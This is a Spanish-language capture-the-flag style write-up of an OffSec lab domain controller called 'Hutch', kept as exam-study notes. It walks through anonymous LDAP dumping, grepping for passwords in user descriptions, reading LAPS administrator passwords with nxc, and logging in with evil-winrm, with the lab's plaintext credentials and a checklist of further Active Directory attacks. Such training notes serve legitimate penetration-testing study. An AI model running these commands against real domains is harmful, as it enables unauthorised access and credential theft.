## Hutch — lo que me faltó (y el patrón para la próxima)

> Caja: HUTCHDC `hutch.offsec` · DC Windows Server 2019 · LAPS + IIS/WebDAV
> Cadena final:
> `LDAP anon bind → pass en description (fmcsorley) → LAPS read (ms-Mcs-AdmPwd) → Administrator local del DC → Evil-WinRM → SYSTEM`

---

### A) Credencial filtrada en atributos LDAP (Posición 1 → 2)

**El fallo no fue técnica, fue lectura.** Volqué todo el árbol con `ldapsearch` pero el oro estaba escondido entre cientos de líneas: el usuario `fmcsorley` tenía la contraseña en texto plano dentro del atributo `description`.

```
description: Password set to CrabSharkJellyfish192 at user's request. Please change on next login.
```

**Por qué pasa:** los admins dejan notas ("reset de password", "cuenta de servicio", etc.) en los campos de texto libre del objeto AD, y el bind anónimo de LDAP los deja leer. Campos sospechosos: `description`, `info`, `comment`, `userPrincipalName` raros.

**Regla fija: nunca leer el volcado LDAP a ojo. Filtrarlo siempre.**

```bash
# volcado completo con bind anónimo (null bind)
ldapsearch -x -H ldap://$IP -b "DC=hutch,DC=offsec" > ldap_dump.txt

# cazar credenciales / notas en campos de texto libre
grep -i -E "descr|pass|pwd|comment|info|key|secret" ldap_dump.txt

# equivalente rápido con nxc (saca descripciones de usuarios)
nxc ldap $IP -u '' -p '' -M get-desc-users
```

**Validar la credencial encontrada por los 3 vectores** (SMB/LDAP valen aunque WinRM no):

```bash
nxc smb   $IP -u $USER -p "$PASS"
nxc winrm $IP -u $USER -p "$PASS"
nxc ldap  $IP -u $USER -p "$PASS"
```

> [!tip] En Hutch `fmcsorley` validó en SMB y LDAP pero **NO** en WinRM. Eso no es un callejón sin salida: una credencial sin shell sigue sirviendo para enumerar ACLs vía LDAP (siguiente paso).

---

### B) LAPS: leer la contraseña del Administrator local vía ACL (Posición 3)

**El desbloqueo mental:** tenía credencial válida pero sin shell y me atasqué. La pregunta correcta no es *¿dónde puedo loguear?* sino **¿qué permisos tiene este usuario sobre otros objetos?**

`fmcsorley` tenía permiso de lectura sobre el atributo **`ms-Mcs-AdmPwd`** (LAPS), que guarda la **contraseña del Administrator local de cada equipo en texto claro dentro del AD**. Leerla en el objeto del propio DC = admin del DC.

```bash
# módulo laps de nxc: lo resuelve en segundos si sospechas el vector
nxc ldap $IP -u $USER -p "$PASS" -M laps

# -> Computer:HUTCHDC$   Password:S3BEhk1ph;qxkV
```

**Alternativa manual (por si el módulo falla):**

```bash
nxc ldap $IP -u $USER -p "$PASS" --query "(ms-Mcs-AdmPwd=*)" "ms-Mcs-AdmPwd sAMAccountName"
```

**Entrar con la clave de LAPS** (es la cuenta Administrator del DC, Evil-WinRM entra directo):

```bash
nxc smb  $IP -u Administrator -p 'S3BEhk1ph;qxkV' --local-auth   # espera Pwn3d!
evil-winrm -i $IP -u Administrator -p 'S3BEhk1ph;qxkV'
```

> [!warning] LAPS **rota** la contraseña cada X minutos. Si tardas, vuelve a lanzar `-M laps` para releer la actual. La clave suele llevar símbolos (`;`, `#`) → **siempre entre comillas simples**.

---

### Patrón para el examen

> Con cualquier credencial de bajo privilegio en AD, antes de rendirte, **enumera qué puede hacer ese usuario**, no solo dónde puede loguear.
> - `BloodHound` te dibuja el grafo de ACLs (edges: `ReadLAPSPassword`, `GenericAll`, `WriteDacl`...).
> - Los módulos de `nxc` (`laps`, `maq`, `gmsa`, `get-desc-users`, `read-only`) resuelven el vector en segundos si ya lo sospechas.

**Checklist cuando tengo 1 credencial y no sé avanzar:**
- [ ] `nxc` smb/winrm/ldap para ver dónde autentica y dónde es admin
- [ ] `-M laps` (¿puedo leer ms-Mcs-AdmPwd de algún equipo?)
- [ ] BloodHound `--collection All` → mirar "Outbound Object Control" del usuario
- [ ] Kerberoast / AS-REP roast
- [ ] Shares y descripciones de usuarios (`-M spider_plus`, `-M get-desc-users`)
